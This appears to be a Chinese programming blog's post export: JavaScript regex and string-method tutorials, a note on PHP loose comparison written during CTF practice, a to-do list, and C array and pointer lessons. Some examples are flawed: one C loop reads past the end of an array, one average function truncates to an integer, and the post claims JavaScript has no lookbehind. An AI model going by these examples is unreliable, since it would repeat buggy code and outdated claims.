<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var string &#x3D; &quot;12345678 123456789&quot;,</span><br><span class="line"></span><br><span class="line">reg &#x3D; &#x2F;(?!\b)(?&#x3D;(\d&#123;3&#125;)+\b)&#x2F;g;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">var result &#x3D; string.replace(reg, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12,345,678 123,456,789&quot;</span><br></pre></td></tr></table></figure>

<p>其中<code>(?!\b)</code>怎么理解呢？</p>
<p>要求当前是一个位置，但不是<code>\b</code>前面的位置，其实<code>(?!\b)</code>说的就是<code>\B</code>。</p>
<p>因此最终正则变成了：<code>/\B(?=(\d{3})+\b)/g</code>。</p>
<h4 id="验证密码问题"><a href="#验证密码问题" class="headerlink" title="验证密码问题"></a><strong>验证密码问题</strong></h4><p>密码长度6-12位，由数字、小写字符和大写字母组成，但必须至少包括2种字符。</p>
<h5 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h5><p>不考虑“但必须至少包括2种字符”这一条件。我们可以容易写出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>

<h5 id="判断是否包含有某一种字符"><a href="#判断是否包含有某一种字符" class="headerlink" title="判断是否包含有某一种字符"></a><strong>判断是否包含有某一种字符</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;(?&#x3D;.*[0-9])^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>

<p><strong><em>(?=.[0-9])代表我们将匹配的字符串其后应该是：任意个任意字符后加一个数字，即存在数字。</em></strong></p>
<h5 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;((?&#x3D;.*[0-9])(?&#x3D;.*[a-z])|(?&#x3D;.*[0-9])(?&#x3D;.*[A-Z])|(?&#x3D;.*[a-z])(?&#x3D;.*[A-Z]))^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>



<h5 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h5><p>“至少包含两种字符”的意思就是说，不能全部都是数字，也不能全部都是小写字母，也不能全部都是大写字母。</p>
<p>那么要求“不能全部都是数字”，怎么做呢？<code>(?!p)</code>出马！</p>
<p>对应的正则是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;(?!^[0-9]&#123;6,12&#125;$)^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>

<p><strong><em>(?!^[0-9]{6,12}$)代表我们将匹配的字符串，该位置后不能满足^[0-9]{6,12}$，即全是数字。</em></strong></p>
<h6 id="另一种解法的最终答案"><a href="#另一种解法的最终答案" class="headerlink" title="另一种解法的最终答案"></a>另一种解法的最终答案</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;(?!^[0-9]&#123;6,12&#125;$)(?!^[a-z]&#123;6,12&#125;$)(?!^[A-Z]&#123;6,12&#125;$)^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>









<h3 id="非捕获性分组"><a href="#非捕获性分组" class="headerlink" title="非捕获性分组"></a>非捕获性分组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;先看用捕获性分组匹配会返回什么</span><br><span class="line">var str1 &#x3D; &#39;000aaa111&#39;;             </span><br><span class="line">var pattern &#x3D; &#x2F;([a-z]+)(\d+)&#x2F;; &#x2F;&#x2F;捕获性分组匹配</span><br><span class="line">var arr &#x3D; pattern.exec(str1);  </span><br><span class="line">console.log(arr) &#x2F;&#x2F;[&#39;aaa111&#39;,&#39;aaa&#39;,&#39;111&#39;]   结果子串也获取到了，这并不是我们想要的结果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;非捕获性分组</span><br><span class="line">var str2 &#x3D; &#39;000aaa111&#39;;</span><br><span class="line">var pattern2 &#x3D; &#x2F;(?:[a-z]+)(?:\d+)&#x2F;; &#x2F;&#x2F;非捕获性分组匹配</span><br><span class="line">var arr2 &#x3D; pattern2.exec(str2);  </span><br><span class="line">console.log(arr2) &#x2F;&#x2F;[&#39;aaa111&#39;]  结果正确</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「lihefei_coder」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;lihefei_coder&#x2F;article&#x2F;details&#x2F;53022253</span><br></pre></td></tr></table></figure>



<h3 id="前瞻：-和"><a href="#前瞻：-和" class="headerlink" title="前瞻：(?=)和(?!)"></a><strong>前瞻：(?=)和(?!)</strong></h3><p>正向前瞻匹配一批图片格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;正向前瞻，匹配.jpg后缀文件名</span><br><span class="line">var str &#x3D; &#39;123.jpg,456.gif,abc.jpg&#39;;</span><br><span class="line">var partern &#x3D; &#x2F;\w+(?&#x3D;\.jpg)&#x2F;g; &#x2F;&#x2F;正向前瞻匹配</span><br><span class="line">console.log(str.match(partern)); &#x2F;&#x2F;[&#39;123&#39;, &#39;abc&#39;]   返回结果正确，没有匹配456.gif</span><br></pre></td></tr></table></figure>



<h3 id="后顾：-lt-和-lt-—JavaScript不支持"><a href="#后顾：-lt-和-lt-—JavaScript不支持" class="headerlink" title="后顾：(?&lt;=)和(?&lt;!)  —JavaScript不支持"></a>后顾：(?&lt;=)和(?&lt;!)  <em>—JavaScript不支持</em></h3><p>后顾分为正向后顾和反(负)向后顾，正向后顾<strong>(?&lt;=表达式)</strong>表示前面要有什么，反向后顾(?表示前面不能有什么。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;正向后顾</span><br><span class="line">(?&lt;&#x3D;abc) &#x2F;&#x2F;前面需要有abc</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;反向后顾</span><br><span class="line">(?&lt;!abc) &#x2F;&#x2F;前面不能有abc</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JS</category>
      </categories>
  </entry>
  <entry>
    <title>JS test()/exec()函数 [字符串是否匹配]</title>
    <url>/2020/01/04/JS-test-exec-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regex.test(string);</span><br></pre></td></tr></table></figure>

<p><em>即判断string中有无与regex中匹配的字符串</em></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &#x2F;G&#x2F;;               &#x2F;&#x2F;也可以用var str&#x3D;RegEx(&quot;G&quot;);</span><br><span class="line">    document.write(str.test(&quot;Welcome to Albatross-G!&quot;));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;script&gt;中两行可以变成一行（如下）</span><br><span class="line">&#x2F;&#x2F;document.write(&#x2F;G&#x2F;.test(&quot;Welcome to Albatross-G!&quot;)</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br></pre></td></tr></table></figure>

<h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><h2 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>exec() 方法用于检索字符串中的正则表达式的匹配。</p>
<p>该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regex.exec(string);</span><br></pre></td></tr></table></figure>

<p><em>与test()相比不同是，如果匹配到了会返回匹配内容而不是true。</em></p>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &#x2F;G&#x2F;;               &#x2F;&#x2F;也可以用var str&#x3D;RegEx(&quot;G&quot;);</span><br><span class="line">    document.write(str.exec(&quot;Welcome to Albatross-G!&quot;));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;script&gt;中两行可以变成一行（如下）</span><br><span class="line">&#x2F;&#x2F;document.write(&#x2F;G&#x2F;.exec(&quot;Welcome to Albatross-G!&quot;)</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS search()/repalce()函数 [找/替代字符串]</title>
    <url>/2020/01/03/JS%20search()%20repalce()%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.search(regex(正则表达式));</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://albatross-g.github.io/2020/01/04/JS-正则表达式/" target="_blank" rel="noopener">正则表达式(regex)</a></p>
</blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &quot;Visit Runoob!&quot;; </span><br><span class="line">    var n &#x3D; str.search(&#x2F;runoob&#x2F;i);&#x2F;&#x2F;其中i表示搜索不区分大小写</span><br><span class="line">    document.write(n);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>



<h2 id="replace"><a href="#replace" class="headerlink" title="replace()"></a>replace()</h2><h3 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.replace(regex(被替换),string(用来替换));</span><br></pre></td></tr></table></figure>

<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &quot;Visit Baidu!&quot;; </span><br><span class="line">    var n &#x3D; str.replace(&#x2F;baidu&#x2F;i,&quot;Albatross-G&quot;);</span><br><span class="line">    document.write(n);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Visit Albatross-G!</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS indexOf()函数 [检索字符在字符串的位置]</title>
    <url>/2020/01/03/JS%20indexOf()%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="indexOf"><a href="#indexOf" class="headerlink" title="indexOf()"></a>indexOf()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。</p>
<p>如果没有找到匹配的字符串则返回 -1。</p>
<p><strong>注意：</strong> indexOf() 方法区分大小写。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.indexOf(searchvalue,start)</span><br></pre></td></tr></table></figure>

<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>searchvalue</td>
<td>必需。规定需检索的字符串值</td>
</tr>
<tr>
<td>start</td>
<td>可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 string Object.length - 1。如省略该参数，则将从字符串的首字符开始检索。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var str&#x3D;&quot;Hello world, welcome to the universe.&quot;;</span><br><span class="line">var n&#x3D;str.indexOf(&quot;e&quot;);</span><br><span class="line">document.write(n); &#x2F;&#x2F;输出变量不需要加&quot;&quot;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>



<h3 id="相似函数lastIndexOf"><a href="#相似函数lastIndexOf" class="headerlink" title="相似函数lastIndexOf()"></a>相似函数lastIndexOf()</h3><p><em>注意i要大写！</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var str&#x3D;&quot;Hello world, welcome to the universe.&quot;;</span><br><span class="line">var n&#x3D;str.lastIndexOf(&quot;e&quot;);</span><br><span class="line">document.write(n);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">35</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP弱类型比较</title>
    <url>/2020/01/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<p>前两天在做南邮ctf“md5 collision”时，遇到了关于php弱类型比较的问题，当时搞得似懂非懂，所以今天查了有关资料然后稍微总结一下。</p>
<h2 id="php完全相等-“-”"><a href="#php完全相等-“-”" class="headerlink" title="php完全相等(“===”)"></a>php完全相等(“===”)</h2><p>“===” 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>也就是说如果两边字符串类型就不同的话，就直接判断为两边不相等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;&quot;1abc&quot;);</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
<p>甚至</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;1e0);</span><br></pre></td></tr></table></figure>
<p>这种我们正常认知里数值相等的结果也是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内。</p>
</blockquote>
<p>所以1e0被认为是浮点数，类型不同自然不相等。</p>
<blockquote>
<p><strong>注意：</strong>使用var_dump函数时，在括号内如果给整型(如1)增加””变成(“1”),则”1”会被认为是字符串。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;&quot;1&quot;)</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<h2 id="php弱相等-“-”"><a href="#php弱相等-“-”" class="headerlink" title="php弱相等(“==”)"></a>php弱相等(“==”)</h2><h3 id="php弱相等比较表"><a href="#php弱相等比较表" class="headerlink" title="php弱相等比较表"></a>php弱相等比较表</h3><p>首先看一张图，一般比较就参考下图。</p>
<p><img src="/2020/01/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/weak.jpg" alt="weak"></p>
<h3 id="php弱相等时类型的转化"><a href="#php弱相等时类型的转化" class="headerlink" title="php弱相等时类型的转化"></a>php弱相等时类型的转化</h3><p>首先一定要注意：<strong>只有当类型不同时才会转化！</strong><br>“1e1234567”会被看成浮点型，正常计算法则计算即可<br>“1e1234abc”会被看成字符串，转化规则：<br>取第一个字母之前的数字，如无数字则为0。<br>如：1a1234abc转化为1，abcd转化为0。</p>
<h3 id="一些发现"><a href="#一些发现" class="headerlink" title="一些发现"></a>一些发现</h3><p>可是笔者经过一些测试发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(&quot;1e2abc&quot;&#x3D;&#x3D;100);</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
<p>也就是说如果第一个非e/E字母前满足科学计数法形式，会先计算科学计数法数变成整型然后去掉之后字母。</p>
<p><img src="/2020/01/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/1.jpg" alt="1"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>比较</tag>
        <tag>数据类型的转化</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-03日目标</title>
    <url>/2020/01/02/2020-01-03%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<p>1. 9:30在1307考html<br>2. 10min英语听力+10个英语单词<br>3. <a href="https://www.runoob.com/js/js-typeof.html" target="_blank" rel="noopener">JS typeof操作符</a>-JS代码规范<br>4. <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南邮ctf “这题不是web”</a><br>5. CSS盒子模型</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>以数组作为函数参数的两种方法</title>
    <url>/2020/01/01/%E4%BB%A5%E6%95%B0%E7%BB%84%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>数组可以作为函数的参数使用，进行数据传送。数组作为函数参数有两种形式。<br>（1）把元素作为实参使用。<br>（2）把数组名作为函数的形参和实参使用。</p>
<h2 id="数组元素作为函数实参"><a href="#数组元素作为函数实参" class="headerlink" title="数组元素作为函数实参"></a>数组元素作为函数实参</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void test(int v);</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    int a[10]&#x3D;&#123;1,2,3,4,-1,-2,-3,-4,2,3&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;&#x3D;10;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        test(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void test(int v)</span><br><span class="line">&#123;</span><br><span class="line">    if(v&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d\n&quot;,v);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;0\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组名作为函数参数"><a href="#数组名作为函数参数" class="headerlink" title="数组名作为函数参数"></a>数组名作为函数参数</h2><p>注：<br>（1）与数组元素作为函数参数不同的是，用数组名作为函数参数时，要求形参与相对应的实参都必须是类型相同的数组，否则会发生错误。<br>（2）用数组名作为函数参数时，并不是进行值的传递，即不是把实参数组的每一个元素的值都赋与形参数组的各个元素。因为实际上形参数组并不存在，编译系统并不为形参数组分配内存。<br>数据的传递：数组名就是数组的首地址。因此在数组名作为函数参数时所进行的传递只是地址的传递，也就是说把实参数组的首地址赋予形参数组名。形参数组名取得该首地址之后，也等于有了实际的数组，即实参与形参有一段共用的内存空间。</p>
<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void test (int b[10]);</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    int a[10]&#x3D;&#123;2,4,6,8,10,12,14,16,18,20&#125;;</span><br><span class="line">    test(a);</span><br><span class="line">    putchar(&#39;\n&#39;);</span><br><span class="line">&#125;</span><br><span class="line">void test (int b[10])</span><br><span class="line">&#123;</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    for(;i&lt;10;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%6d&quot;,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有一个一维数组score，内放10个学生成绩，求平均成绩。（写一个average函数获取平均成绩）。</span><br><span class="line"> </span><br><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">double average(double array[10]);&#x2F;*函数声明*&#x2F;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    double score[10]&#x3D;&#123;82,100,55,80,64,78,26,65,36,85&#125;,result;</span><br><span class="line">    result&#x3D;average(score);</span><br><span class="line">    printf(&quot;%lf\n&quot;,result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double average(double array[10])</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    double f&#x3D;0;</span><br><span class="line">    for(i&#x3D;0;i&lt;&#x3D;9;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f+&#x3D;array[i];</span><br><span class="line">    &#125;</span><br><span class="line">    f &#x2F;&#x3D; 10;</span><br><span class="line">    return (f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>函数</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>初学C语言指针的一些思考</title>
    <url>/2020/01/01/%E5%88%9D%E5%AD%A6C%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h2 id="函数求平均数-没用到指针"><a href="#函数求平均数-没用到指针" class="headerlink" title="函数求平均数(没用到指针)"></a>函数求平均数(没用到指针)</h2><p>我们先看一个用函数求平均数的例子<br>这里面没有用到指针</p>
<h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int Getaverage(int arr[5],int size);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int sz[5]&#x3D;&#123;1,2,3,4,5&#125;;</span><br><span class="line">	double average;</span><br><span class="line">	average&#x3D;Getaverage(sz,5);</span><br><span class="line">	printf(&quot;%lf&quot;,average);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Getaverage(int arr[5],int size)</span><br><span class="line">&#123;</span><br><span class="line">	int i,sum&#x3D;0;</span><br><span class="line">	double ave;</span><br><span class="line">	for(i&#x3D;0;i&lt;size;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum&#x3D;sum+arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	ave&#x3D;sum&#x2F;size;</span><br><span class="line">	return ave;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（在C语言中若要把数组作为函数参数，要遵循其规则，详情可见文章<a href="https://albatross-g.github.io/2020/01/01/%E4%BB%A5%E6%95%B0%E7%BB%84%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">以数组作为函数参数的两种方法.docx</a>）</p>
<h2 id="函数求平均数-用到指针"><a href="#函数求平均数-用到指针" class="headerlink" title="函数求平均数(用到指针)"></a>函数求平均数(用到指针)</h2><p>按文章中的规定此时 形参（arr[5]）和 实参（sz）类型必须相同，所以如果我们main中的sz数组中数字个数发生了变化，则Getaverage也要改变形参，变得非常麻烦，于是我们有了以下对指针的引用。</p>
<h3 id="普通版"><a href="#普通版" class="headerlink" title="普通版"></a>普通版</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;* 函数声明 *&#x2F;</span><br><span class="line">double getAverage(int *arr, int size);</span><br><span class="line"> </span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">   &#x2F;* 带有 5 个元素的整型数组  *&#x2F;</span><br><span class="line">   int balance[5] &#x3D; &#123;1000, 2, 3, 17, 50&#125;;</span><br><span class="line">   double avg;</span><br><span class="line"> </span><br><span class="line">   &#x2F;* 传递一个指向数组的指针作为参数 *&#x2F;</span><br><span class="line">   avg &#x3D; getAverage( balance, 5 ) ;</span><br><span class="line"> </span><br><span class="line">   &#x2F;* 输出返回值  *&#x2F;</span><br><span class="line">   printf(&quot;Average value is: %f\n&quot;, avg );</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double getAverage(int *arr, int size)</span><br><span class="line">&#123;</span><br><span class="line">  int    i, sum &#x3D; 0;      </span><br><span class="line">  double avg;          </span><br><span class="line"> </span><br><span class="line">  for (i &#x3D; 0; i &lt; size; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    sum +&#x3D; arr[i];</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  avg &#x3D; (double)sum &#x2F; size;</span><br><span class="line"> </span><br><span class="line">  return avg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话，*arr相当于把数组的首地址分配给了函数，就不必对每一次实参的改变调整形参。</p>
